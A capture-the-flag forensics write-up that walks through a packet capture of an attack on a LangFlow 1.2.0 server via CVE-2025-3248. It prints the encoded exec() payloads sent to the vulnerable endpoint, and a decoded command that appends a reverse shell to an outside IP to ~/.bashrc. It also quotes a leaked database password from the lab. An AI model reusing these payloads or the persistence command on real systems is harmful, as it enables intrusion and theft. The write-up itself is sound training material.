# Forensics: Watchtower Of Mists

## Description
The tower’s lens, once clear for stargazing, was now veiled in thick mist. Merrin, a determined forensic investigator, climbed the spiraling stairs of Egrath’s Hollow. She found her notes strangely rearranged, marked with unknown signs. The telescope had been deliberately turned downward, focused on the burial grounds. The tower had been occupied after a targeted attack. Not a speck of dust lay on the glass, something unseen had been watching. What it witnessed changed everything. Can you help Merrin piece together what happened in the Watchtower of Mists?

**Skills learned:**
* Network traffic analysis

**File attachment(s):**
```text
forensics_watchtower_of_mists.zip
└── capture.pcap
```

## Questions

1. What is the LangFlow version in use?

I started analyzing the pcap file by looking at the HTTP GET requests. Applying the Wireshark display filter **http.request.method == GET** we see the full list of GET requests, where one happens to point to a useful API endpoint: `/api/v1/version`.

*[Image: Tower_task1]*

Following the HTTP stream of the highlighted packet gives us the LangFlow version:
```
GET /api/v1/version HTTP/1.1
Host: ai.watchtower.htb:7860
User-Agent: gobuster/3.8
Accept-Encoding: gzip

HTTP/1.1 200 OK
date: Mon, 15 Sep 2025 10:10:02 GMT
server: uvicorn
content-length: 63
content-type: application/json

{"version":"1.2.0","main_version":"1.2.0","package":"Langflow"}
```

**Answer: 1.2.0**

---

2. What is the CVE assigned to this LangFlow vulnerability?

Searching for `langflow 1.2.0 cve` online gives us the answer [here](https://nvd.nist.gov/vuln/detail/CVE-2025-3248).

We can confirm this is the vulnerability that was exploited by searching for POST requests to the **/api/v1/validate/code** endpoint in the pcap file.

Applying the display filter **http.request.method == POST**, we see 4 packets pointing to the vulnerable endpoint: each with suspicious encoded payloads:

*[Image: Tower_task2]*

```
POST /api/v1/validate/code HTTP/1.1
Host: ai.watchtower.htb:7860
User-Agent: Mozilla/5.0
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive
Content-Type: application/json
Content-Length: 222

{"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJwFwcEJgDAMAMBVJK8WxA18uoH/UEugwdaEpEHH984KOy3HV0kny5MQeajYREzgcalJJXfIW21Ub5SYGjPB26QMhnXxRr3vpwXl/ANKDhvB')).decode())): pass\n"}
```

**Answer: CVE-2025-3248**

---

3. What is the name of the API endpoint exploited by the attacker to execute commands on the system?

We discovered this while investigating task 2.

**Answer: /api/v1/validate/code**

---

4. What is the IP address of the attacker?

We can find all the endpoints who have sent traffic in this capture by openging the **Statistics > Endpoints** tab. We only have two IPs included:
* 141.101.64.3
* 188.114.96.12

*[Image: Tower_task4]*

We can confirm which of these two is the attacker by re-looking at the packet in task 2. We can see the source IP address 188.114.96.12 is sending the suspicious encoded packets.

**Answer: 188.114.96.12**

---

5. The attacker used a persistence technique, what is the port used by the reverse shell?

I first tried finding this answer by looking at the ports involved in the network communication under **Statistics > IPv4 Statistics > Destinations and Ports**. This turned out to be a dead end as none of the listed ports for 188.114.96.12 appeared to be used by a reverse shell.

Then I pivoted to begin decoding the suspicious packets sent to the vulnerable API endpoint. I used [CyberChef](https://gchq.github.io/CyberChef/) to decode the string using the recipe **From Base64 -> Zlib Inflate**. This allowed us to read the attacker's commands in plaintext.

One of the packets contains an interesting payload that is encoded even one step further:
```
{"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64')
.b64decode('eJwNyE0LgjAYAOC/MnZSKguNqIOCpAdDK8IIT0Pnyza1JvsIi+i313N8VC00oHSiMBoh
Hw4h4j5KZQhxsLbNqCQFrbHrUQ60J9Ka0RoHA+USUZ+x/Nazs6hY7l+GVuxWVRA/i7KY8i62x3dmi
/02OCXXV5bEs0OXhp+m1rBZo8WiBSpbQFGEvkvvv1xRPEeawzCEpbLguj8DMjVN
')).decode())): pass\n"}
```

decodes to
```
raise Exception(__import__("subprocess").check_output("echo 
c2ggLWkgPiYgL2Rldi90Y3AvMTMxLjAuNzIuMC83ODUyIDA+JjE=|base64 --decode 
>> ~/.bashrc", shell=True))
```

and decoding the second encrypted string from Base64:

*[Image: Tower_task5]*

Now we can see the attacker's command to establish their reverse shell.

**Answer: 7852**

---

6. What is the system machine hostname?

Continuing to investigate that attacker's malicious POST requests, we can see the output they received:
```
POST /api/v1/validate/code HTTP/1.1
Host: ai.watchtower.htb:7860
User-Agent: Mozilla/5.0
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive
Content-Type: application/json
Content-Length: 222

{"code": "\ndef run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJwFwcEJgDAMAMBVSl4tiBv4dAP/QUOgxdqEJhHH926ezTjtH7F6k5ER26MyHTGDxaVTiM2grFSZbpRwDc/A44UlWeXet2MGl/ID83MahQ==')).decode())): pass\n"}
HTTP/1.1 200 OK
date: Mon, 15 Sep 2025 10:10:07 GMT
server: uvicorn
content-length: 951
content-type: application/json

{"imports":{"errors":[]},"function":{"errors":["b'TOKENIZERS_PARALLELISM=false\\nHOSTNAME=aisrv01\\nPYTHON_PIP_VERSION=24.0\\nHOME=/app/data\\nLANGFLOW_DATABASE_URL=postgresql://langflow:LnGFlWPassword2025@postgres:5432/langflow\\nLANGFLOW_HOST=0.0.0.0\\nGPG_KEY=7169605F62C751356D054A26A821E680E5FA6305\\nOPENAI_API_KEY=dummy\\nASTRA_ASSISTANTS_QUIET=true\\nLANGFLOW_PORT=7860\\nLANGFLOW_CONFIG_DIR=app/langflow\\nPYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py\\nSERVER_SOFTWARE=gunicorn/23.0.0\\nGRPC_VERBOSITY=ERROR\\nPATH=/app/.venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\nTIKTOKEN_CACHE_DIR=/app/.venv/lib/python3.12/site-packages/litellm/litellm_core_utils/tokenizers\\nLANG=C.UTF-8\\nPYTHON_VERSION=3.12.3\\nPWD=/app\\nPYTHON_GET_PIP_SHA256=dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9\\nUSER_AGENT=langflow\\n'"]}}
```

The encoded command sent was `raise Exception(__import__("subprocess").check_output("env", shell=True))` which executed **env** on the remote server. We can see the hostname in the server's response: `HOSTNAME=aisrv01`

**Answer: aisrv01**

---

7. What is the Postgres password used by LangFlow?

The LangFlow password can also be found in the **env** output in task 6: `LANGFLOW_DATABASE_URL=postgresql://langflow:LnGFlWPassword2025@postgres:5432/langflow`

**Answer: LnGFlWPassword2025**